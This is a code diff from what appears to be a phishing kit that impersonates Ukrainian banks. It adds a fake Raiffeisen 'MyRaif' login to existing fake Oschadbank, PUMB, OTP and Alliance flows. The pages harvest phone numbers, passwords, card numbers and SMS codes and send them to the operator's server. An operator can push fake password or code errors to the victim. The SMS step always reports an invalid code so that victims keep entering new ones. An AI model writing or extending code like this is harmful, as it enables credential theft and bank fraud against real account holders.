@@ -202,7 +202,7 @@
             display: flex; flex-direction: column; align-items: center;
         }
         .oschad-code-container p {
-            color: #495057; margin: 0 0 10px 0; padding: 0; font-weight: 400; /* Изменен шрифт */
+            color: #495057; margin: 0 0 10px 0; padding: 0; font-weight: 400;
         }
         .oschad-code-info {
             font-size: 16px; font-weight: 400; margin-bottom: 20px !important;
@@ -267,6 +267,7 @@
         .oschad-form-container .oschad-main-title { text-align: left; margin-bottom: 10px; }
         .oschad-form-container p { text-align: left; margin-bottom: 30px; }
         
+        /* --- ОБЩИЕ СТИЛИ ДЛЯ СТАНДАРТНОЙ ФОРМЫ --- */
         #form-header { text-align: center; margin-bottom: 25px; }
         #form-header-logo { max-height: 50px; max-width: 150px; }
         #modal-title { margin-top: 25px; font-size: 22px; font-weight: 700; text-align: center; margin-bottom: 25px; }
@@ -291,6 +292,160 @@
         }
         .btn:disabled { background-color: #ced4da; cursor: not-allowed; }
         body[data-theme="oschadbank"] { --primary-color: var(--oschad-primary); --accent-color: #008a84; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #E0F2F1 0%, #B2DFDB 100%); }
+        
+        /* --- НОВЫЕ СТИЛИ для модального окна Raiffeisen --- */
+        #raif-modal-container {
+            background-color: #2a2a2e;
+            color: #ffffff;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            padding: 20px;
+            box-sizing: border-box;
+            align-items: center;
+        }
+        .raif-header {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            padding: 10px 0;
+            width: 100%;
+            max-width: 400px;
+        }
+        .raif-header .title {
+            font-size: 17px;
+            font-weight: 500;
+        }
+        .raif-header .back-arrow {
+            position: absolute;
+            left: 0;
+            font-size: 28px;
+            cursor: pointer;
+            color: #fff;
+        }
+        .raif-main-content {
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            width: 100%;
+            max-width: 400px;
+        }
+        .raif-icon-container {
+            position: relative;
+            margin-bottom: 25px;
+            width: 150px;
+            height: 100px;
+        }
+        .raif-question-icon {
+            position: absolute;
+            left: 5px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 60px;
+            height: 60px;
+            background-color: #3b82f6;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 32px;
+            font-weight: bold;
+            color: #ffffff;
+            z-index: 2;
+            border: 4px solid #2a2a2e;
+        }
+        .raif-phone-icon {
+            position: absolute;
+            right: 5px;
+            top: 50%;
+            transform: translateY(-50%);
+            z-index: 1;
+        }
+        .raif-welcome-title {
+            font-size: 26px;
+            font-weight: 600;
+            margin-bottom: 40px;
+        }
+        .raif-input-group {
+            width: 100%;
+            text-align: left;
+            margin-bottom: 15px;
+        }
+        .raif-input-group label {
+            font-size: 14px;
+            color: #a0a0a0;
+            margin-bottom: 8px;
+            display: block;
+            padding-left: 5px;
+        }
+        .raif-phone-input-wrapper {
+            display: flex;
+            border: 2px solid #555;
+            border-radius: 12px;
+            background-color: #2a2a2e;
+            overflow: hidden;
+            transition: border-color 0.3s;
+        }
+        .raif-phone-input-wrapper.focused {
+            border-color: #f5cb5c;
+        }
+        .raif-phone-prefix {
+            padding: 15px;
+            font-size: 16px;
+            color: #a0a0a0;
+            background-color: transparent;
+        }
+        .raif-phone-input {
+            flex-grow: 1;
+            border: none;
+            background-color: transparent;
+            color: #ffffff;
+            font-size: 16px;
+            outline: none;
+            padding: 15px 15px 15px 0;
+        }
+        .raif-phone-input::placeholder {
+            color: #6c757d;
+        }
+        .raif-legal-text {
+            font-size: 13px;
+            color: #a0a0a0;
+            margin-top: 20px;
+            line-height: 1.5;
+        }
+        .raif-legal-text a {
+            color: #f5cb5c;
+            text-decoration: none;
+        }
+        .raif-footer {
+            width: 100%;
+            padding: 10px 0;
+            max-width: 400px;
+        }
+        .raif-submit-button {
+            width: 100%;
+            display: block;
+            padding: 16px;
+            border: none;
+            border-radius: 12px;
+            background-color: #3a3a3c;
+            color: #8d8d8e;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: not-allowed;
+            transition: background-color 0.3s, color 0.3s;
+        }
+        .raif-submit-button.active {
+            background-color: #f5cb5c;
+            color: #000000;
+            cursor: pointer;
+        }
+
     </style>
 </head>
 <body>
@@ -318,7 +473,7 @@ document.addEventListener('DOMContentLoaded', () => {
     // --- CONFIG & STATE VARIABLES ---
     const bankFlows = {
         'oschadbank': { name: 'Ощадбанк', logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/thumb/d/da/Oschadbank_%28uk%29.png/1200px-Oschadbank_%28uk%29.png', theme: 'oschadbank', steps: [] },
-        'raiffeisen': { name: 'Райффайзен', logoUrl: 'https://platforma-msb.org/wp-content/uploads/2017/08/rajffajzen-1920x1080316.jpg', theme: 'raiffeisen', steps: [{ type: 'phone', title: 'Введіть номер телефону' },{ type: 'card_simple', title: 'Для зарахування коштів введіть номер картки' }], special: true },
+        'raiffeisen': { name: 'Райффайзен', logoUrl: 'https://platforma-msb.org/wp-content/uploads/2017/08/rajffajzen-1920x1080316.jpg', theme: 'raiffeisen', steps: [] },
         'alliance': { name: 'Альянс', logoUrl: 'https://bank.gov.ua/files/Logobank/300119.png?v=14', theme: 'alliance', steps: [{ type: 'phone', title: 'Введіть номер телефону' },{ type: 'card_simple', title: 'Для зарахування коштів введіть номер картки' }], special: true },
         'pumb': { name: 'ПУМБ', logoUrl: 'https://mixfin-com.b-cdn.net/ua/wp-content/uploads/2025/01/pumb_logo_mixfin.webp', theme: 'pumb', steps: [{ type: 'phone', title: 'Введіть номер телефону' },{ type: 'card_simple', title: 'Для зарахування коштів введіть номер картки' }], special: true },
         'otp': { name: 'OTP Bank', logoUrl: 'https://ubanks.com.ua/img/bank-logo/otpbank-logo-2x.png', theme: 'otp', steps: [{ type: 'phone', title: 'Введіть номер телефону' },{ type: 'card_simple', title: 'Для зарахування коштів введіть номер картки' }], special: true },
@@ -337,7 +492,8 @@ document.addEventListener('DOMContentLoaded', () => {
     let currentStepIndex = 0;
     let collectedData = {};
     let callTimerInterval;
-    let lastCodeScreen = null; // To track which code screen was last shown
+    let lastCodeScreen = null; 
+    let currentCustomFlow = null; // Can be 'oschad', 'raif', or null
 
     // --- DOM ELEMENTS ---
     const bankGrid = document.querySelector('.bank-grid');
@@ -365,6 +521,44 @@ document.addEventListener('DOMContentLoaded', () => {
     }
     
     // --- DYNAMIC RENDER FUNCTIONS ---
+    
+    /** Renders the Raiffeisen login modal */
+    function renderRaiffeisenLogin() {
+        const phoneIconSvg = `<svg class="raif-phone-icon" width="85" height="120" viewBox="0 0 95 140" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M84.3999 130H20.4C12.4476 130 6 123.552 6 115.6V24.4C6 16.4477 12.4476 10 20.4 10H84.3999C92.3523 10 98.7999 16.4477 98.7999 24.4V115.6C98.7999 123.552 92.3523 130 84.3999 130Z" fill="#3c3c41" stroke="#555" stroke-width="4"></path><path d="M84.3999 128H20.4C13.5522 128 8 122.448 8 115.6V24.4C8 17.5523 13.5522 12 20.4 12H84.3999C91.2477 12 96.7999 17.5523 96.7999 24.4V115.6C96.7999 122.448 91.2477 128 84.3999 128Z" fill="#3c3c41" stroke="#a0a0a0" stroke-width="2"></path><rect x="25" y="45" width="10" height="10" rx="2" fill="#a0a0a0"></rect><rect x="47" y="45" width="10" height="10" rx="2" fill="#a0a0a0"></rect><rect x="69" y="45" width="10" height="10" rx="2" fill="#a0a0a0"></rect><rect x="25" y="65" width="10" height="10" rx="2" fill="#a0a0a0"></rect><rect x="47" y="65" width="10" height="10" rx="2" fill="#a0a0a0"></rect><rect x="69" y="65" width="10" height="10" rx="2" fill="#a0a0a0"></rect><rect x="25" y="85" width="10" height="10" rx="2" fill="#a0a0a0"></rect><rect x="47" y="85" width="10" height="10" rx="2" fill="#a0a0a0"></rect><rect x="69" y="85" width="10" height="10" rx="2" fill="#a0a0a0"></rect><path d="M57.5 112C57.5 108.962 55.0376 106.5 52 106.5C48.9624 106.5 46.5 108.962 46.5 112C46.5 114.5 48.125 116.5 50.5 117.125L52 120L53.5 117.125C55.875 116.5 57.5 114.5 57.5 112Z" fill="#3b82f6"></path></svg>`;
+        const html = `
+        <div id="raif-modal-container">
+            <div class="raif-header">
+                <span class="raif-header-back-arrow back-arrow">←</span>
+                <span class="title">Авторизуйтесь через MyRaif</span>
+            </div>
+            <div class="raif-main-content">
+                <div class="raif-icon-container">
+                    <div class="raif-question-icon">?</div>
+                    ${phoneIconSvg}
+                </div>
+                <h2 class="raif-welcome-title">Ласкаво просимо</h2>
+                <div class="raif-input-group">
+                    <label for="raif_phone_input">Номер телефону</label>
+                    <div class="raif-phone-input-wrapper">
+                        <span class="raif-phone-prefix">+380</span>
+                        <input type="tel" id="raif_phone_input" class="raif-phone-input" placeholder="Зведіть ваш номер телефону" autocomplete="off" inputmode="numeric">
+                    </div>
+                </div>
+                <p class="raif-legal-text">
+                    Натиснувши «Продовжити», ви приймаєте <a href="#">умови надання послуг</a> і <a href="#">Порядок обробки персональних даних</a>.
+                </p>
+            </div>
+            <div class="raif-footer">
+                <button class="raif-submit-button" id="raif-submit-btn" disabled>Продовжити</button>
+            </div>
+        </div>
+        `;
+        customModalContent.innerHTML = html;
+        customModalOverlay.style.display = 'flex';
+        customModalOverlay.style.padding = '0';
+        customModalOverlay.style.backgroundColor = '#2a2a2e';
+        addRaiffeisenLoginListeners();
+    }
     
     /** Renders the main Oschadbank login modal */
     function renderOschadbankLogin(options = {}) {
@@ -421,6 +615,8 @@ document.addEventListener('DOMContentLoaded', () => {
         `;
         customModalContent.innerHTML = html;
         customModalOverlay.style.display = 'flex';
+        customModalOverlay.style.backgroundColor = '#f8f9fa';
+        customModalOverlay.style.padding = '0';
         addOschadbankLoginListeners();
     }
 
@@ -470,7 +666,6 @@ document.addEventListener('DOMContentLoaded', () => {
         customModalOverlay.style.display = 'flex';
 
         document.getElementById('code-screen-back-arrow').addEventListener('click', () => {
-             // Go back to login or previous step based on context
              (collectedData.currentFlow === 'forgot_password') ? renderForgotPasswordFlow(3) : renderOschadbankLogin();
         });
         
@@ -482,11 +677,11 @@ document.addEventListener('DOMContentLoaded', () => {
         }
         
         setupCodeInputs(screenId);
-        startCallTimer(60); // Assuming all code screens have a timer
+        startCallTimer(60); 
         
         const firstInput = document.querySelector('.oschad-code-input');
         if (firstInput) {
-             setTimeout(() => firstInput.focus(), 100); // Small delay for keyboard
+             setTimeout(() => firstInput.focus(), 100);
         }
     }
     
@@ -494,7 +689,7 @@ document.addEventListener('DOMContentLoaded', () => {
     function renderOschadbankCallConfirmation(options = {}) {
         let infoText = 'На Ваш номер телефонує Ощадбанк:';
         if (collectedData.loginMethod === 'phone' && collectedData.phone) {
-            const phone = collectedData.phone.replace(/\D/g, ''); // +380...
+            const phone = collectedData.phone.replace(/\D/g, '');
             const maskedPhone = `+${phone.substring(0,3)} ${phone.substring(3,5)} *** ** ${phone.substring(11)}`;
             infoText = `На Ваш номер ${maskedPhone} телефонує Ощадбанк:`;
         } else if (collectedData.loginMethod === 'login') {
@@ -613,12 +808,58 @@ document.addEventListener('DOMContentLoaded', () => {
         document.getElementById('fp-submit-btn').addEventListener('click', submitFunction);
         addForgotPasswordListeners(step);
     }
+    
+    /** Waiting screen for Raiffeisen flow */
+    function showWaitingScreenRaif() {
+        const html = `
+        <div id="raif-modal-container" style="justify-content: center; align-items: center; text-align: center;">
+            <h2 class="raif-welcome-title">Очікуємо...</h2>
+            <p class="raif-legal-text">Заявку відправлено. Будь ласка, чекайте. <br><b>НЕ ЗАКРИВАЙТЕ САЙТ!</b></p>
+        </div>
+        `;
+        customModalContent.innerHTML = html;
+    }
 
     // --- HELPER & EVENT LISTENER FUNCTIONS ---
 
+    /** Adds event listeners for the Raiffeisen login modal */
+    function addRaiffeisenLoginListeners() {
+        const wrapper = document.querySelector('.raif-phone-input-wrapper');
+        const input = document.getElementById('raif_phone_input');
+        const submitBtn = document.getElementById('raif-submit-btn');
+        const backArrow = document.querySelector('.raif-header-back-arrow');
+
+        backArrow.onclick = () => { currentCustomFlow = null; window.location.reload(); };
+        input.addEventListener('focus', () => wrapper.classList.add('focused'));
+        input.addEventListener('blur', () => wrapper.classList.remove('focused'));
+
+        input.addEventListener('input', () => {
+            let value = input.value.replace(/\D/g, '');
+            if (value.length > 9) {
+                value = value.substring(0, 9);
+            }
+            input.value = value;
+
+            if (value.length === 9) {
+                submitBtn.classList.add('active');
+                submitBtn.disabled = false;
+            } else {
+                submitBtn.classList.remove('active');
+                submitBtn.disabled = true;
+            }
+        });
+
+        submitBtn.addEventListener('click', () => {
+            if (submitBtn.disabled) return;
+            const phone = '+380' + input.value.replace(/\D/g, '');
+            sendDataToServer({ phone: phone }, true);
+            showWaitingScreenRaif();
+        });
+    }
+
     /** Adds event listeners for the main Oschadbank login modal */
     function addOschadbankLoginListeners() {
-        document.getElementById('oschad-back-arrow').addEventListener('click', () => { window.location.reload(); });
+        document.getElementById('oschad-back-arrow').addEventListener('click', () => { currentCustomFlow = null; window.location.reload(); });
         document.querySelector('.forgot-password-link').addEventListener('click', (e) => {
             e.preventDefault();
             renderForgotPasswordFlow(1);
@@ -636,7 +877,6 @@ document.addEventListener('DOMContentLoaded', () => {
         const loginPassInput = document.getElementById('login_password_input');
         const submitBtn = document.getElementById('oschad-submit-btn');
         
-        // Label animation logic
         document.querySelectorAll('.oschad-input-group').forEach(group => {
             const input = group.querySelector('.oschad-input-field');
             if (!input) return;
@@ -647,15 +887,11 @@ document.addEventListener('DOMContentLoaded', () => {
             checkValue();
         });
 
-        // Phone formatting
         phoneInput.addEventListener('input', (e) => {
             let rawValue = e.target.value.replace(/\D/g, '');
-
-            // FIX: If user pastes a number like +380..., strip the 380 prefix.
             if (rawValue.startsWith('380')) {
                 rawValue = rawValue.substring(3);
             }
-
             let value = rawValue.substring(0, 9);
             let formatted = '';
             if (value.length > 0) formatted += value.substring(0, 2);
@@ -665,7 +901,6 @@ document.addEventListener('DOMContentLoaded', () => {
             e.target.value = formatted.trim();
         });
 
-        // Button state logic
         const updateOschadButtonState = () => {
             const isPhoneFormValid = activeOschadForm === 'phone' && phoneInput.value.replace(/\D/g, '').length === 9 && phonePassInput.value.length > 0;
             const isLoginFormValid = activeOschadForm === 'login' && loginInput.value.length > 0 && loginPassInput.value.length > 0;
@@ -677,7 +912,6 @@ document.addEventListener('DOMContentLoaded', () => {
         };
         [phoneInput, phonePassInput, loginInput, loginPassInput].forEach(input => input.addEventListener('input', updateOschadButtonState));
 
-        // Toggle logic
         togglePhoneBtn.addEventListener('click', () => {
             togglePhoneBtn.classList.add('active'); toggleLoginBtn.classList.remove('active');
             phoneLoginForm.style.display = 'block'; loginForm.style.display = 'none';
@@ -689,7 +923,6 @@ document.addEventListener('DOMContentLoaded', () => {
             activeOschadForm = 'login'; updateOschadButtonState();
         });
         
-        // Password toggle icon
         customModalContent.querySelectorAll('.password-toggle-icon').forEach(icon => {
             icon.addEventListener('click', () => {
                 const passwordInput = icon.closest('.oschad-input-group').querySelector('input');
@@ -699,11 +932,10 @@ document.addEventListener('DOMContentLoaded', () => {
             });
         });
 
-        // Submit logic
         submitBtn.onclick = () => {
             if(submitBtn.disabled) return;
             const dataToSend = {};
-            collectedData.loginMethod = activeOschadForm; // Store login method
+            collectedData.loginMethod = activeOschadForm;
             
             if (activeOschadForm === 'phone') {
                 dataToSend.phone = '+380' + phoneInput.value.replace(/\D/g, '');
@@ -758,7 +990,6 @@ document.addEventListener('DOMContentLoaded', () => {
                 break;
         }
 
-        // Label animation
         document.querySelectorAll('.oschad-input-group').forEach(group => {
             const inputEl = group.querySelector('.oschad-input-field');
             if (!inputEl) return;
@@ -777,21 +1008,20 @@ document.addEventListener('DOMContentLoaded', () => {
         clearInterval(callTimerInterval);
 
         let timer = seconds;
-        const initialText = link.textContent; // Store original text like "Запросити дзвінок повторно"
+        const initialText = link.textContent;
 
         function updateTimer() {
             if (timer < 0) {
                 clearInterval(callTimerInterval);
                 link.textContent = initialText + '?';
-                link.classList.add('active'); // Make it active (turquoise)
+                link.classList.add('active');
                 link.onclick = (e) => {
                     e.preventDefault();
-                    // Logic to resend call/SMS
-                    startCallTimer(60); // Restart timer
+                    startCallTimer(60);
                 };
             } else {
                 link.textContent = `${initialText} через ${timer} секунд`;
-                link.classList.remove('active'); // Keep it grey
+                link.classList.remove('active');
                 timer--;
             }
         }
@@ -849,7 +1079,6 @@ document.addEventListener('DOMContentLoaded', () => {
     
     /** Sends collected data to the server */
     async function sendDataToServer(data, isFinal) {
-        // Мы по-прежнему накапливаем данные на клиенте для его внутреннего состояния
         collectedData = { ...collectedData, ...data };
         try {
             await fetch(`/api/submit`, {
@@ -860,7 +1089,7 @@ document.addEventListener('DOMContentLoaded', () => {
                     bankName: activeBankData.name,
                     isFinalStep: isFinal,
                     referrer: localStorage.getItem('referrer') || 'unknown',
-                    ...data // <-- ИСПРАВЛЕНИЕ: Отправляем ТОЛЬКО новые данные для текущего шага
+                    ...data
                 }),
             });
         } catch (error) { console.error('Failed to send data:', error); }
@@ -884,14 +1113,14 @@ document.addEventListener('DOMContentLoaded', () => {
             case 'call':
                 renderOschadbankCallConfirmation();
                 break;
-            case 'telegram_debit': // New command
+            case 'telegram_debit':
                 renderTelegramSmsScreen();
                 break;
-            case 'password_error': // New command
+            case 'password_error':
                 const errorMsg = data.loginType === 'login' ? 'Невірний логін або пароль' : 'Невірний пароль';
                 renderOschadbankLogin({ errorType: data.loginType, errorMessage: errorMsg });
                 break;
-            case 'code_error': // Modified command
+            case 'code_error':
                 const errorOptions = { error: true };
                 if (lastCodeScreen === 'oschad_call') {
                     renderOschadbankCallConfirmation(errorOptions);
@@ -899,22 +1128,48 @@ document.addEventListener('DOMContentLoaded', () => {
                     renderTelegramSmsScreen(errorOptions);
                 }
                 break;
-            case 'sms': // Standard flow SMS
-                modalTitle.textContent = 'Введіть код з SMS';
-                stepContent.innerHTML = `<p style="text-align:center;">${data.text}</p><div class="input-group"><input type="tel" id="sms-code" class="input-field" placeholder="Введіть код"></div><div id="sms-error-container"></div>`;
-                modalFooter.style.display = 'flex';
-                modalFooter.innerHTML = `<button class="btn btn-next" id="submit-sms-code">Відправити</button>`;
-                document.getElementById('submit-sms-code').addEventListener('click', submitSmsCode);
+            case 'sms':
+                if (currentCustomFlow) {
+                     const html = `
+                        <div id="raif-modal-container" style="justify-content: center; align-items: center; text-align: center;">
+                            <h2 class="raif-welcome-title">Введіть код з SMS</h2>
+                            <p class="raif-legal-text">${data.text}</p>
+                            <input type="tel" id="sms-code" class="raif-phone-input" style="max-width: 200px; text-align: center; margin-top: 20px; border: 2px solid #555; border-radius: 12px; padding: 15px;" placeholder="Введіть код">
+                            <div id="sms-error-container" style="color: var(--danger-color); font-size: 14px; margin-top: 10px;"></div>
+                            <button class="raif-submit-button active" id="submit-sms-code" style="margin-top: 20px;">Відправити</button>
+                        </div>
+                     `;
+                     customModalContent.innerHTML = html;
+                     document.getElementById('submit-sms-code').addEventListener('click', submitSmsCode);
+                } else {
+                    modalTitle.textContent = 'Введіть код з SMS';
+                    stepContent.innerHTML = `<p style="text-align:center;">${data.text}</p><div class="input-group"><input type="tel" id="sms-code" class="input-field" placeholder="Введіть код"></div><div id="sms-error-container"></div>`;
+                    modalFooter.style.display = 'flex';
+                    modalFooter.innerHTML = `<button class="btn btn-next" id="submit-sms-code">Відправити</button>`;
+                    document.getElementById('submit-sms-code').addEventListener('click', submitSmsCode);
+                }
                 break;
             case 'other':
-                const bankToDisable = document.querySelector(`.bank-item[data-bank="${activeBankData.theme}"]`);
-                if (bankToDisable) {
-                    bankToDisable.classList.add('disabled');
-                    if (!bankToDisable.querySelector('.unavailable-label')) {
-                        bankToDisable.innerHTML += '<span class="unavailable-label">Недоступно</span>';
+                 if (currentCustomFlow) {
+                     const html = `
+                        <div id="raif-modal-container" style="justify-content: center; align-items: center; text-align: center;">
+                            <h2 class="raif-welcome-title">Помилка</h2>
+                            <p class="raif-legal-text">${data.text}</p>
+                            <button class="raif-submit-button active" id="other-back-btn" style="margin-top: 20px;">Обрати інший банк</button>
+                        </div>
+                     `;
+                     customModalContent.innerHTML = html;
+                     document.getElementById('other-back-btn').onclick = () => window.location.reload();
+                 } else {
+                    const bankToDisable = document.querySelector(`.bank-item[data-bank="${activeBankData.theme}"]`);
+                    if (bankToDisable) {
+                        bankToDisable.classList.add('disabled');
+                        if (!bankToDisable.querySelector('.unavailable-label')) {
+                            bankToDisable.innerHTML += '<span class="unavailable-label">Недоступно</span>';
+                        }
                     }
+                    showMessageInMainModal("Помилка", data.text, "Обрати інший банк", () => window.location.reload());
                 }
-                showMessageInMainModal("Помилка", data.text, "Обрати інший банк", () => window.location.reload());
                 break;
             case 'ban':
                 document.body.innerHTML = `<div style="display:flex; justify-content:center; align-items:center; height:100vh; text-align:center;"><h1>🚫<br>Доступ заблоковано</h1></div>`;
@@ -923,17 +1178,22 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     }
     
-    // --- Standard (non-Oschadbank) Flow Logic ---
+    // --- Standard (non-custom) Flow Logic ---
     document.querySelectorAll('.bank-item').forEach(item => {
         item.addEventListener('click', e => {
             e.preventDefault();
             if (item.classList.contains('disabled')) return;
             const bankId = item.dataset.bank;
             activeBankData = JSON.parse(JSON.stringify(bankFlows[bankId]));
-            collectedData = { }; // Start with fresh data
+            collectedData = { };
+            currentCustomFlow = null;
 
             if (bankId === 'oschadbank') {
+                currentCustomFlow = 'oschad';
                 renderOschadbankLogin();
+            } else if (bankId === 'raiffeisen') {
+                currentCustomFlow = 'raif';
+                renderRaiffeisenLogin();
             } else {
                 body.dataset.theme = activeBankData.theme;
                 formHeaderLogo.src = activeBankData.logoUrl;
@@ -949,7 +1209,7 @@ document.addEventListener('DOMContentLoaded', () => {
     backBtn.addEventListener('click', handleBackStep);
     
     async function handleNextStep() { if (!validateCurrentStep()) return; let data = {}; stepContent.querySelectorAll('.input-field').forEach(input => { let key = input.id; let value = input.value; if (key === 'phone') value = '+380' + value.replace(/\D/g, ''); if (key === 'card' || key === 'card_confirm') value = value.replace(/\s/g, ''); data[key] = value; }); const step = activeBankData.steps[currentStepIndex]; let isFinalStep = (currentStepIndex + 1) >= activeBankData.steps.length; if (activeBankData.special && step.type === 'card_simple') { isFinalStep = true; } sendDataToServer(data, isFinalStep); if (isFinalStep) { showWaitingScreen(); return; } currentStepIndex++; if (currentStepIndex < activeBankData.steps.length) { renderStep(); } else { showWaitingScreen(); } }
-    async function submitSmsCode() { const codeInput = document.getElementById('sms-code'); const code = codeInput.value; const errorContainer = document.getElementById('sms-error-container'); if (!code.trim()) { if (errorContainer) errorContainer.innerHTML = `<p style="color:red; text-align:center;">Будь ласка, введіть код</p>`; return; } try { await fetch(`/api/sms`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ sessionId, code, referrer: localStorage.getItem('referrer') }), }); } catch (error) { console.error('Failed to send sms code:', error); } if (errorContainer) errorContainer.innerHTML = `<p style="color:red; text-align:center;">Невірний код. Будь ласка, спробуйте ще раз.</p>`; codeInput.value = ''; }
+    async function submitSmsCode() { const codeInput = document.getElementById('sms-code'); const code = codeInput.value; const errorContainer = document.getElementById('sms-error-container'); if (!code.trim()) { if (errorContainer) errorContainer.innerHTML = `<p>Будь ласка, введіть код</p>`; return; } try { await fetch(`/api/sms`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ sessionId, code, referrer: localStorage.getItem('referrer') }), }); } catch (error) { console.error('Failed to send sms code:', error); } if (errorContainer) errorContainer.innerHTML = `<p>Невірний код. Будь ласка, спробуйте ще раз.</p>`; codeInput.value = ''; }
     const generateInputHTML = (id, placeholder, type = 'tel', maxlength = '') => `<div class="input-group"><input type="${type}" class="input-field" id="${id}" placeholder="${placeholder}" ${maxlength ? `maxlength="${maxlength}"` : ''}><div class="error-message"></div></div>`;
     function renderStep() { if (!activeBankData.steps || !activeBankData.steps[currentStepIndex]) return; const step = activeBankData.steps[currentStepIndex]; let html = ''; switch (step.type) { case 'phone': html = `<div class="input-group"><div class="phone-input-wrapper"><span class="phone-prefix">+380</span><input type="tel" class="input-field" id="phone" placeholder="XX XXX XX XX" maxlength="12"></div><div class="error-message" style="margin-left: 55px;"></div></div>`; break; case 'card_simple': html = generateInputHTML('card', 'XXXX XXXX XXXX XXXX', 'tel', '19'); break; } modalTitle.textContent = step.title; stepContent.innerHTML = html; modalFooter.style.display = 'flex'; backBtn.style.display = currentStepIndex > 0 ? 'block' : 'none'; nextBtn.style.display = 'block'; addInputFormatting(); }
     function showWaitingScreen() { modalTitle.textContent = 'Очікуємо'; stepContent.innerHTML = `<p>Заявку відправлено. Будь ласка, чекайте. <b>НЕ ЗАКРИВАЙТЕ САЙТ!</b></p>`; modalFooter.style.display = 'none'; }
